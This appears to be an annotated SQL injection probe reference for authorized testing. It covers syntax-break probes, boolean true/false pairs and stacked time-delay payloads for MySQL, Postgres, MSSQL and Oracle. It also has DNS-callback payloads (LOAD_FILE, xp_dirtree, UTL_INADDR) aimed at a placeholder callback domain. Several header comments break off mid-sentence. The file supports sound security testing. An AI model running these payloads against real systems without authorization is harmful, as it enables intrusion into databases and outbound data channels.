# Representation / annotation convention (all sections): payload characters end
# before the two-or-more-space alignment gap preceding "# purpose:". The gap and
# annotation are not SQL input. Internal payload spaces remain significant.

# Each payload line has a comment giving (a) its purpose, (b)

# level of context doesn't drop off in later sections.

# SQL input and URL-encoded transport are distinct representations. A wire %27
# becomes a quote only after an evidenced percent-decode; literal SQL input %27
# is not a quote. Wire %2527 needs another decode to become a quote. Do not treat

# Display notation --<space> means -- followed by one ASCII space (U+0020), not
# literal angle brackets. For MySQL entries ending in bare --, explicitly include
# that space in the constructed input when using it as a comment (wire --%20 in
# a URL-encoded value); neither alignment padding nor invisible end-of-line
# whitespace supplies it automatically. Comments begin only in a compatible SQL
# lexical context outside literals/quoted identifiers; suffix/newline and remaining
# parentheses still matter. Do not copy display notation or annotations as input.

# ============================================================================
# ========================== PHASE 1 — DETECTION =============================
# ============================================================================
# Syntax-sensitivity probes only. These probes are intended to test parser
# sensitivity and syntax boundaries; they are not intended to extract,
# modify, or enumerate application data. (Note: some of these — e.g. `;`
# and `--` — can still change how the parser terminates or comments out the
# remainder of a statement, which is exactly the syntax-boundary signal
# being tested for; that is distinct from deliberately injecting query
# logic, which starts in Phase 2.)

'                           # purpose: single quote, classic string-context break | applies: any string-context parameter | limit: syntax probe only, no query logic injected
"                           # purpose: double-quote boundary hypothesis | applies: existing context supports a double-quoted string or identifier, depending on DBMS/mode | limit: syntax probe only; acceptance does not identify which context
')                          # purpose: quote + closing paren, e.g. WHERE id=('$id') | applies: compatible quoted, parenthesized input, not necessarily a function | limit: syntax probe only
'))                         # purpose: quoted input in two grouping layers hypothesis | applies: nesting is plausible from existing context and the test can distinguish competing shapes; no diagnostic counting layers required | limit: syntax compatibility only, not SQLI-2; account for remaining suffix per SKILL.md 1b
")                          # purpose: double-quote variant of the above | applies: same as above, double-quoted variant | limit: syntax probe only
`                           # purpose: backtick, MySQL identifier-quote context | applies: MySQL identifier hypothesis supported by existing context | limit: syntax probe only; an unknown engine alone is not a reason to cycle delimiters
;                           # purpose: statement terminator, some drivers/engines surface a distinct error | applies: any candidate; also used to gauge stacked-query support | limit: syntax probe only, do not chain a second statement here
--                          # purpose: inline comment marker, checks whether the rest of the query is swallowed | applies: any candidate | limit: syntax probe only
%27                         # purpose: literal percent-encoded spelling to distinguish decoding hypotheses | applies: existing context supports a meaningful encoding-boundary test | limit: syntax probe only; logical %27 and wire %27/%2527 differ, do not assume double decoding

# --- Comment/suffix contrasts (synthetic SQL, not additional payload lines) ---
# SELECT '--tail'; keeps the marker inside a literal; it starts no comment.
# SELECT 1 --+ 1 returns 1 in SQLite, while a physical newline before + 1
# resumes parsing and returns 2. SELECT (1 --) instead loses a needed closing
# parenthesis. Comment acceptance never proves controlled injected evaluation.
# MySQL requires whitespace/control after --; SQLite does not. See SKILL.md 1b
# and https://dev.mysql.com/doc/refman/8.4/en/comments.html and
# https://www.sqlite.org/lang_comment.html . Preserve actual newline/wire bytes.

# --- Engine fingerprinting — extended reference (indicators only, not exploit payloads) ---
# Use this table to narrow down the engine before selecting Phase 2
# payloads, per SKILL.md "Engine identification". These are recognition
# signals — function names, concatenation syntax, comment syntax — not
# payloads to inject for effect. Pair with the error-string reference
# below when a probe does produce a visible error.
#
# Engine     | Function-based tell               | String concatenation      | Comment syntax
# -----------|-------------------------------------|----------------------------|----------------
# MySQL      | version(), database(), user()       | CONCAT(a,b) or a||b*       | --<space>, #, /* */
# Postgres   | version(), current_database()        | a || b                     | -- , /* */
# MSSQL      | @@version, DB_NAME()                 | a + b                      | -- , /* */
# Oracle     | banner from v$version, USER          | a || b                     | -- , /* */
# SQLite     | sqlite_version()                     | a || b                     | -- , /* */
# * MySQL only treats || as concatenation in PIPES_AS_CONCAT sql_mode; CONCAT() is the reliable default.
# MySQL -- comments require a following whitespace/control character; preserve it
# on the wire. SQLite/Postgres/MSSQL -- comments do not have that requirement.
# Comments only start outside literals; check remaining parentheses/query structure.
#
# These indicators are for identification only — do not use a
# function-based tell as a live extraction probe outside of the Phase 3
# fingerprint reads further down this file.

# Error-string reference (for engine identification — see SKILL.md):
#   MySQL:    "SQL syntax.*MySQL", "Warning: mysqli"
#   Postgres: "pg_query", "PostgreSQL.*ERROR"
#   MSSQL:    "Microsoft OLE DB", "Unclosed quotation mark", "System.Data.SqlClient"
#   Oracle:   "ORA-\d{5}"
#   SQLite:   "SQLITE_ERROR", "SQLite3::", "sqlite3.OperationalError", Sequelize "dialects/sqlite/"
# SQLSTATE is shared across DBMSs; Sequelize alone does not identify its dialect.

# Choose a technique from observed behavior, candidate context, capability and

# Boolean pairs and timing controls use their own comparison/repetition rules.
# For controlled error-based or bounded UNION-based proof, follow the Phase 2
# paths in SKILL.md: owned control, compatible expression/projection and a

# No column-count probing, schema/table enumeration, real-row or secret reads;
# fingerprints remain gated Phase 3. No drop-in error/UNION payload pack is supplied.

# --- Boolean-based (when a meaningful differential is available) ------------
# Literal 1 is illustrative, not a universally matching seed. In 1 AND 1=1,
# the leading 1 is the seed; AND 1=1 is the predicate (1=2 is its FALSE form).
# In 1' AND '1'='1 the seed is the first 1, the next quote attempts breakout,
# and the remaining equality depends on the application's closing quote/suffix.
# Numeric forms assume an unquoted expression; quoted forms assume a compatible
# string boundary. Parenthesized positions also need compatible closing/opening
# parentheses and grouping, not merely a copied quote. A known matching seed
# establishes a benign match, not SQL breakout or predicate evaluation.
# Adapt the seed and quote/parenthesis/prefix/suffix to observed context per
# SKILL.md 2a. These are not drop-in LIKE-pattern probes: a trailing wildcard can
# change an equality's truth value. If compatibility is unresolved, check intended
# TRUE preserves the known benign marker before dependent FALSE; do not batch them.
# Being inside quotes is insufficient: prefix/suffix, grouping, parentheses,
# wildcards or comments can invalidate the predicate or its intended truth value.
# Equal empty/error responses are inconclusive, not SQLi absence; reassess the
# context/oracle if TRUE loses the marker. Reuse suitable existing observations.
1 AND 1=1                  # purpose: intended TRUE, numeric expression | applies: known matching seed, compatible AND row filter and surrounding grouping; should preserve benign marker | limit: missing marker requires oracle reassessment, no data read
1 AND 1=2                  # purpose: intended FALSE in the same numeric shape | applies: compatible TRUE established; should exclude its marker | limit: equal empties/errors leave comparison unresolved, no data read
1' AND '1'='1              # purpose: intended TRUE, quoted-string breakout | applies: known match, balanced surrounding SQL with suffix preserving equality; quotes alone are insufficient | limit: TRUE must preserve benign marker; trailing wildcard can invalidate equality, no data read
1' AND '1'='2              # purpose: intended FALSE in the same quoted shape | applies: compatible TRUE established; should exclude its marker with unchanged prefix/suffix | limit: equal responses with unestablished TRUE are inconclusive, no data read
1 OR 1=1                   # purpose: alternate intended TRUE form | applies: evidence supports an OR-compatible context/oracle; AND failure alone is insufficient | limit: confirmation only, no data read

# --- Controlled error / bounded UNION interpretation (illustrative, not input) ---
# Control -> hypothesis -> computed marker -> expected response -> falsifier -> repeatability.
# Control: an owned benign response has no distinguishable computed marker.
# Hypothesis: an already compatible expression is evaluated into a visible error
# field, or an already compatible UNION projection has an observable output slot.
# Computed marker: the non-sensitive expression 7 * 7 would yield 49; pick a result
# distinguishable from ordinary output, absent in the control and not input echo.
# Expected response: actually observe 49 in that error field/output slot rather
# than the unevaluated text 7 * 7. Intending the computation is not observing it.
# Synthetic contrasts (not payload lines or session evidence): response "input:
# 7 * 7" is raw echo; response "computed:49" supports evaluation only with the
# compatible expression and owned controls; baseline "computed:49" already present
# defeats that marker's discrimination. Choose a distinguishable computation or
# another justified oracle, then apply repeatability; do not infer evaluation.
# Falsifier: only parser errors/input echo, the marker already in ordinary rows,
# no computed result, a type mismatch, hidden errors or uninterpretable output.
# Those observations do not prove controlled evaluation. Unknown projection or
# missing observable slot is a limitation, not a reason for column/type enumeration.
# Repeatability and owned-evidence requirements are in SKILL.md's corresponding
# Phase 2 paths; a success/error contrast is not a Boolean pair. No drop-in query
# or mandatory Boolean test is implied by this explanatory computation.

# --- Time-based, per engine (pick ONE engine per "Engine identification") ---
# NOTE — stacked queries: these examples predominantly assume stacked-query
# support: the semicolon after the seed introduces another statement/block.
# DBMS identity alone does not establish compatibility. It only works if the
# application's driver/connection permits multiple statements per query
# — many are not (e.g. most PHP mysqli/PDO defaults, many ORMs). A stacked
# payload that produces no delay and no error is NOT evidence against SQL
# injection — it may simply mean stacked queries aren't permitted here. If
# a stacked time-based probe is inconclusive, don't treat that as a
# negative on its own. Select another bounded plan only with distinct context
# and oracle support; do not force boolean or in-line timing variants to complete
# a sequence. Missing compatibility/oracle remains unresolved.
# The SQL input position and surrounding statement must permit the seed,
# terminator and suffix; required functions/procedures and execution privileges
# must be available. Oracle additionally needs a driver/input path accepting the
# PL/SQL block, not merely an Oracle fingerprint. Use observable adapter elapsed_ms
# and a meaningful equivalent zero-delay control under comparable conditions;
# SKILL.md defines repetition and timing proof. A rejected function/block or no
# observable delay can reflect incompatibility and is not automatically a SQLi negative.

# MySQL
1;SELECT SLEEP(5)--        # purpose: 5s delay | applies: MySQL, stacked queries permitted | limit: confirmation only, bounded fixed delay
1;SELECT SLEEP(0)--        # purpose: 0s control, must NOT show the delay | applies: same as above, run alongside the 5s probe | limit: control only

# Postgres
1;SELECT pg_sleep(5)--     # purpose: 5s delay | applies: Postgres, stacked queries permitted | limit: confirmation only, bounded fixed delay
1;SELECT pg_sleep(0)--     # purpose: 0s control | applies: same as above | limit: control only

# MSSQL
1;WAITFOR DELAY '0:0:5'--  # purpose: 5s delay | applies: MSSQL, stacked queries permitted | limit: confirmation only, bounded fixed delay
1;WAITFOR DELAY '0:0:0'--  # purpose: 0s control | applies: same as above | limit: control only

# Oracle: the existing DBMS_LOCK examples require EXECUTE privilege and compatible
# PL/SQL block submission. Oracle 19c also documents the DBMS_SESSION.SLEEP
# procedure; that does not supply a universal SQL-expression insertion point.
# Reference: https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/DBMS_SESSION.html
1;BEGIN DBMS_LOCK.SLEEP(5); END;--   # purpose: 5s delay | applies: Oracle, requires EXECUTE on DBMS_LOCK | limit: confirmation only, bounded fixed delay
1;BEGIN DBMS_LOCK.SLEEP(0); END;--   # purpose: 0s control | applies: same as above | limit: control only
# If DBMS_LOCK is unavailable or unauthorized (e.g. the probe errors with
# insufficient privileges rather than timing out), do not substitute an
# expensive recursive/heavy query as a workaround. Fall back to
# boolean-based validation (above) only if its context/oracle supports a distinct
# bounded plan; otherwise retain the limitation as unresolved.

# SQLite: no native SLEEP()-equivalent. Do not attempt to fabricate a delay
# via recursive/heavy queries — that risks unintended load or denial of
# service on the target. If the engine is SQLite, skip timing. Select another
# applicable Phase 2 plan only with supporting context/oracle, or retain the
# limitation. OOB keeps its capability/authorization gates. See SKILL.md 2b note.

# Replace {TOKEN} with a unique, randomly generated subdomain label per
# probe (e.g. an 8-character hex string) so a resulting callback can be
# attributed to the exact probe that caused it. Replace {CALLBACK_DOMAIN}
# with the authorized domain provided by the user. Send once, then poll the
# listener for a hit against that exact token within a reasonable window
# (e.g. 30–60s). A matching, attributable callback can support SQLI-2 under
# SKILL.md. Missing capability or authorization means unattempted; incompatible
# SQL/function/network context means this technique cannot be interpreted.
# Callback absence alone is inconclusive. Only established SQL execution,
# compatible outbound resolution, a working authorized listener, exact-token
# observation and an adequate observation window make absence narrowly meaningful
# for that callback technique. It does not rule out SQLi or by itself complete
# not-confirmed. See SKILL.md 2d and result rules; do not repeat equivalent probes.

# MySQL (requires FILE priv or a UDF path in some configs — try only the
# basic form; do not chain into file read/write if it fails)
1;SELECT LOAD_FILE(CONCAT('\\\\',(SELECT '{TOKEN}'),'.{CALLBACK_DOMAIN}\\a'))--  # purpose: DNS-callback confirmation via UNC path | applies: MySQL with FILE priv, capability-gated (currently unavailable) | limit: binary confirmation only, never chain into file read/write

# MSSQL (xp_dirtree / xp_fileexist trigger a UNC lookup -> DNS)
1;EXEC master..xp_dirtree '\\{TOKEN}.{CALLBACK_DOMAIN}\a'--  # purpose: DNS-callback confirmation via UNC path | applies: MSSQL, capability-gated (currently unavailable) | limit: binary confirmation only

# Postgres (via copy/program is extraction-adjacent and OUT of scope here;
# use a DNS-triggering extension only if already present and confirmed
# non-extractive, e.g. dblink to a hostname that resolves through the
# callback domain — treat as engine-specific and confirm applicability
# before using)
# (no engine-agnostic safe default provided; consult user before improvising)

# Oracle (UTL_HTTP / UTL_INADDR trigger outbound resolution)
1 AND UTL_INADDR.get_host_address('{TOKEN}.{CALLBACK_DOMAIN}') IS NOT NULL--  # purpose: DNS-callback confirmation via outbound resolution | applies: Oracle, capability-gated (currently unavailable) | limit: binary confirmation only
